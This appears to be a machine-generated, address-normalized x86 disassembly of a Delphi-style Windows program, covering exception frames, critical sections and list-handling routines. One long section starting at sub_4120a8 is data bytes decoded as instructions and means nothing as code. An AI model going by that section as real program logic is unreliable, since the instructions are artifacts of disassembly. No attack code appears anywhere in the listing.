mov eax ebx
mov edx edi
call sub_404604
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_411188
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410d58
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_4111d0 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4112ff ]
jmp [ eax * 4 + jump_table_41126c ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_411394
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_411380
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4113d4
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_41140c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_411448
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_40564c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4114bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_411502
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411509
retn
mov eax rw-data
call sub_403ee8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404970
sub_411514
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_411539
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411540
retn
sub_4120a8
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jo r-xdata
outsb
dec ecx
je r-xdata
dec esi
inc ecx
add ah bl
pop ecx
inc ecx
add [ eax ] cl
push eax
inc ecx
add ah bl
push eax
inc ecx
add [ eax ] bl
pop edx
inc ecx
add [ eax ] ch
pop edx
inc ecx
add [ eax + 0x51 ] al
inc ecx
add [ ecx + edx * 2 + 0x52400041 ] dl
inc ecx
add al bl
push ebx
inc ecx
add [ eax ] dh
push esp
inc ecx
add ah al
push esp
inc ecx
add [ eax + 0x57 ] ch
inc ecx
add [ edi + edx * 2 + 0x5a7c0041 ] al
inc ecx
add ah cl
pop eax
inc ecx
add [ esp + ebx * 2 + 0x5c9c0041 ] cl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc ecx
add [ eax + 0x4a ] ch
inc ecx
add [ ecx + ebx * 2 + 0x41 ] al
add [ eax + 0x59 ] bh
inc ecx
add [ ecx + ebx * 2 + 0x41 ] bh
add [ eax + 0x54004159 ] al
dec esi
inc ecx
add ah dh
pop edx
inc ecx
add [ eax + 0x5b ] dl
inc ecx
add [ esp + ebx * 2 ] ah
inc ecx
add [ edx * 2 + 0x5c600041 ] dl
inc ecx
add ah dl
pop esp
inc ecx
add al bh
push esi
inc ecx
add [ edi + edx * 2 ] al
inc ecx
add [ eax - 0x5fffbeb7 ] dh
push edi
inc ecx
add al ah
push edi
inc ecx
add [ eax + ebx * 2 + 0x41 ] cl
add [ eax ] al
dec ebx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
adc al 0x21
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
and [ ecx ] eax
xor [ eax ] al
add [ eax ] al
cwde
pop ds
inc ecx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x24004031 ] cl
pop ebp
imul ebp [ esi + 0x67 ] 0x7473694c
mov esp 0x7004121
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
push ebx
je r-xdata
popad
inc ecx
add [ eax + 0x5d ] dh
inc ecx
add [ eax - 0x3fffbea3 ] cl
sub [ eax ] eax
shr [ ecx ] 0x40
add [ eax ] ch
pop esi
inc ecx
add [ esi + ebx * 2 + 0x54070041 ] ch
push ebx
je r-xdata
and al 0x5d
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
and [ eax ] 0x41
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
adc al 0x23
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and eax [ ecx ]
or [ eax ] al
add [ eax ] al
push eax
and al [ ecx ]
loopne r-xdata
pop esi
inc ecx
inc eax
add ah ch
xor eax [ eax ]
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
mov [ ebx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x100041 ] ah
add [ eax ] al
loopne r-xdata
pop esi
inc ecx
add [ ecx ] bh
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc eax
add ah ch
xor eax [ eax ]
add [ ecx ] bh
inc ecx
add [ 0x6e614854 ] cl
insb
insd
pushfd
and al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x8004122
add [ eax ] al
add al ah
and [ ecx ] eax
loopne r-xdata
popad
add [ ebp + 0x222c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x22 ] cl
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
jns r-xdata
push ebx
je r-xdata
add [ ebx * 2 + 0x5d700041 ] ah
inc ecx
add [ eax + 0x7800415d ] cl
arpl [ ecx ] ax
shr [ ecx ] 0x40
add [ eax - 0x53ffbe9d ] dh
pop esi
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
and al 0x5d
inc ecx
add [ eax + 0x5d ] dh
inc ecx
add [ eax + 0x7800415d ] cl
arpl [ ecx ] ax
in al dx
inc cx
add [ eax - 0x53ffbe9d ] dh
pop esi
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
je r-xdata
insd
popad
insd
add al 0x24
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] ah
inc ecx
add [ eax + eax ] dl
add [ eax ] al
cmp al 0x23
inc ecx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
lodsb [ esi ]
pop esi
inc ecx
add [ esp + 0x540d0041 ] ah
dec ebp
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
and [ ecx + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
and al 0x41
add [ eax ] bl
add [ eax ] al
add [ ebx ] bh
inc ecx
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
push ebx
push ebx
outsd
jb r-xdata
inc ecx
add [ esi + ebx * 2 + 0x64a40041 ] ch
inc ecx
add [ 0x6d654d54 ] cl
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_412bb8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e48
pop edi
pop esi
pop ebx
retn
sub_412be0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e2c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412c08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e50
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412d00
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_414098
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4033c4
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4033c4
test al al
je r-xdata
sub_412d60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412d00
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412d00
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4033c4
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412dd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413eec
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_412e4c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
mov eax [ esi + 0x4 ]
call sub_403198
mov eax [ esi + 0x8 ]
call sub_403198
mov eax [ esi + 0xc ]
call sub_403198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_412e8c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_414098
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4030fc
test al al
jne r-xdata
sub_412eec
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_414098
mov edx eax
mov eax ebp
call sub_4033c4
test al al
jne r-xdata
sub_412f30
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412fcb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030e8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40414c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412e8c
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413eec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412fd2
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
sub_412ff0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404f88
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_413010
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_414098
mov edx edi
call sub_412ff0
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_414098
mov edx edi
call sub_412ff0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413f38
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412ff0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413f38
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4130b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_414098
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412eec
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_413100
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412dd0
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413eec
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_413174
push ebx
push esi
push edi
push ebp
call sub_403524
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
mov eax [ esi + 0x4 ]
mov edx edi
call sub_414098
call sub_403198
inc edi
dec ebp
jne r-xdata
sub_4131d0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_414098
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412d60
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_413214
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412e8c
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_414098
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_413258
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_4132db
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4030e8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132e2
lea eax [ ebp - 0x10c ]
call sub_403ee8
retn
sub_4132e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4131d0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412cf4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_413258
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_414098
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414098
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4033c4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4131d0
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413f38
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413eec
sub_4133d4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414098
mov edx ebp
call sub_412fd8
test al al
jne r-xdata
sub_413418
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412dd0
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413eec
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414098
mov eax [ eax + 0xc ]
mov edx ebp
call sub_4140f4
test eax eax
jge r-xdata
sub_413474
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414098
mov esi eax
mov edx ebp
mov eax esi
call sub_413010
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403198
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413f38
sub_4134c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4133b0
xor eax eax
push ebp
push sub_4135c3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135ca
mov eax [ rw-data ]
call sub_413468
retn
mov eax [ rw-data ]
